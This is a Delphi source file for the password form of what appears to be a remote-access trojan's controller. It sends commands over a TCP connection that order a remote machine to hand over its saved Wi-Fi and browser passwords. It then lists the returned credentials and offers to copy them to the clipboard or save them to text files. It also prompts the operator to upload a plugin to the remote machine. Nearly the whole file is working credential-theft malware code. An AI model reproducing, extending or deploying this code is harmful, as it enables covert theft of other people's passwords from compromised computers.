unit UnitPasswords;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, Menus, UnitConnection, IniFiles, IdTCPServer;

type
  TFormPasswords = class(TForm)
    stat1: TStatusBar;
    pm2: TPopupMenu;
    R2: TMenuItem;
    S2: TMenuItem;
    pm1: TPopupMenu;
    R1: TMenuItem;
    S1: TMenuItem;
    pgc1: TPageControl;
    ts1: TTabSheet;
    lv1: TListView;
    ts2: TTabSheet;
    lv2: TListView;
    C1: TMenuItem;
    C2: TMenuItem;
    N1: TMenuItem;
    N2: TMenuItem;
    C3: TMenuItem;
    C4: TMenuItem;
    C5: TMenuItem;
    dlgSave1: TSaveDialog;
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure lv2ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure R1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure C4Click(Sender: TObject);
    procedure C5Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    procedure UpdateStatus(Status: string);
    function RetrieveWifiPasswords: string;
    function RetrieveBrowsersPasswords: string;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormPasswords: TFormPasswords;

implementation

uses
  UnitConstants, UnitFunctions, UnitRepository;

{$R *.dfm}
                
constructor TFormPasswords.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormPasswords.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormPasswords.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  TmpStr: string;
  TmpItem: TListItem;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = PASSWORDSWIFI then
  begin
    lv1.Clear;
    lv1.Items.BeginUpdate;

    while ReceivedDatas <> '' do
    begin
      TmpItem := lv1.Items.Add;
      TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      Delete(ReceivedDatas, 1, 2);

      TmpItem.ImageIndex := 0;
    end;

    lv1.Items.EndUpdate;
    UpdateStatus('Remote wifi passwords listed: ' + IntToStr(lv1.Items.Count));
  end
  else

  if MainCommand = PASSWORDSBROWSERS then
  begin
    lv2.Clear;
    lv2.Items.BeginUpdate;

     while ReceivedDatas <> '' do
    begin
      TmpItem := lv2.Items.Add;
      TmpItem.Caption := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      TmpItem.SubItems.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
      Delete(ReceivedDatas, 1, 2);

      TmpItem.ImageIndex := 0;
    end;

    lv2.Items.EndUpdate;
    UpdateStatus('Remote browsers passwords listed: ' + IntToStr(lv2.Items.Count));
  end;
end;

procedure TFormPasswords.UpdateStatus(Status: string);
begin
  stat1.Panels.Items[0].Text := Status;
end;
              
function TFormPasswords.RetrieveWifiPasswords: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lv1.Items.Count - 1 do
  begin
    Result := Result + lv1.Column[0].Caption + ': ' + lv1.Items.Item[i].Caption + #13#10;
    Result := Result + lv1.Column[1].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lv1.Column[2].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lv1.Column[3].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + lv1.Column[4].Caption + ': ' + lv1.Items.Item[i].SubItems.Strings[3] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;

function TFormPasswords.RetrieveBrowsersPasswords: string;
var
  i: Integer;
begin
  Result := '';
  for i := 0 to lv2.Items.Count - 1 do
  begin
    Result := Result + lv2.Column[0].Caption + ': ' + lv2.Items.Item[i].Caption + #13#10;
    Result := Result + lv2.Column[1].Caption + ': ' + lv2.Items.Item[i].SubItems.Strings[0] + #13#10;
    Result := Result + lv2.Column[2].Caption + ': ' + lv2.Items.Item[i].SubItems.Strings[1] + #13#10;
    Result := Result + lv2.Column[3].Caption + ': ' + lv2.Items.Item[i].SubItems.Strings[2] + #13#10;
    Result := Result + #13#10#13#10;
  end;
end;

procedure TFormPasswords.lv1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv1.Selected) then
  begin
    for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := False;
    pm1.Items[0].Enabled := True;                                   
    pm1.Items[1].Enabled := True;
  end
  else for i := 0 to pm1.Items.Count - 1 do pm1.Items[i].Enabled := True;
end;

procedure TFormPasswords.lv2ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lv2.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[0].Enabled := True;                                   
    pm2.Items[1].Enabled := True;
  end
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormPasswords.R1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, PASSWORDSWIFI + '|');
  UpdateStatus('Requesting remote wifi passwords, please wait...');
end;

procedure TFormPasswords.S1Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetPasswordsFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'PasswordsWifi_' + MyGetDate('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, RetrieveWifiPasswords);
end;

procedure TFormPasswords.C2Click(Sender: TObject);
begin
  SetClipboardText(lv1.Selected.Caption);
end;

procedure TFormPasswords.C1Click(Sender: TObject);
begin
  SetClipboardText(lv1.Selected.SubItems[3]);
end;

procedure TFormPasswords.R2Click(Sender: TObject);
begin
  if Client.Items.SubItems[10] = 'No' then
  begin
    MessageBox(Handle, 'Plugin is missing on remote machine. Please upload plugin first.',
               PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
               MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  SendDatas(Client.AThread, PASSWORDSBROWSERS + '|');
  UpdateStatus('Requesting remote browsers passwords, please wait...');
end;

procedure TFormPasswords.S2Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetPasswordsFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'PasswordsBrowsers_' + MyGetDate('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, RetrieveBrowsersPasswords);
end;

procedure TFormPasswords.C3Click(Sender: TObject);
begin
  SetClipboardText(lv1.Selected.SubItems[0]);
end;

procedure TFormPasswords.C4Click(Sender: TObject);
begin
  SetClipboardText(lv1.Selected.SubItems[1]);
end;

procedure TFormPasswords.C5Click(Sender: TObject);
begin
  SetClipboardText(lv1.Selected.SubItems[2]);
end;

procedure TFormPasswords.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Passwords', 'Left', Left);
  IniFile.WriteInteger('Passwords', 'Top', Top);
  IniFile.WriteInteger('Passwords', 'Width', Width);
  IniFile.WriteInteger('Passwords', 'Height', Height);
  IniFile.Free;
end;

procedure TFormPasswords.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Passwords', 'Left', 258);
  Top := IniFile.ReadInteger('Passwords', 'Top', 163);
  Width := IniFile.ReadInteger('Passwords', 'Width', 589);
  Height := IniFile.ReadInteger('Passwords', 'Height', 333);
  IniFile.Free;
end;

end.
